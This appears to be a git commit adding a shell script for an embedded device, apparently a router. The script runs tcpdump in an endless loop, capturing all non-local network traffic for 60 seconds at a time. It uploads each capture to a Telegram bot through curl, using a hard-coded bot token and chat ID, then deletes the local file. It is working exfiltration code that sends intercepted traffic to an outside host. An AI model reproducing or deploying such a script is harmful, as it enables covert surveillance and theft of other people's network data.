6aec01a850368386af9219a7bd8b2530ea8b0a5e
seconu <vonfram@outlook.com>
2026-05-06 21:18:02 +0700

    Add files via upload

---
+++ tcpdump_t.sh
@@ -0,0 +1,32 @@
+#!/bin/sh
+
+PCAP_FILE="/tmp/yaffs/capture.pcap"
+DURATION=60
+
+# Telegram config
+BOT_TOKEN="8237132642:AAHZxUKpBwSrHO3NRaNfHOkYfg7MEbHcFro"
+CHAT_ID="-1003748054916"
+
+while true
+do
+    echo "[+] Start tcpdump..."
+
+    # chạy tcpdump trong background
+	chmod 777 /tmp/yaffs/tcpdump
+    /tmp/yaffs/tcpdump -i any -nn -s 0 "not net 192.168.1.0/24" -w $PCAP_FILE >/dev/null 2>&1 &
+    TCPDUMP_PID=$!
+	
+    sleep $DURATION
+
+    echo "[+] Stop tcpdump..."
+    kill -2 $TCPDUMP_PID
+    sleep 2
+
+    echo "[+] Upload file to Telegram..."
+    /userfs/bin/curl -k -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendDocument" \
+        -F chat_id="$CHAT_ID" \
+        -F document=@"$PCAP_FILE" >/dev/null 2>&1
+    echo "[+] Delete file..."
+    rm -rf $PCAP_FILE
+
+done
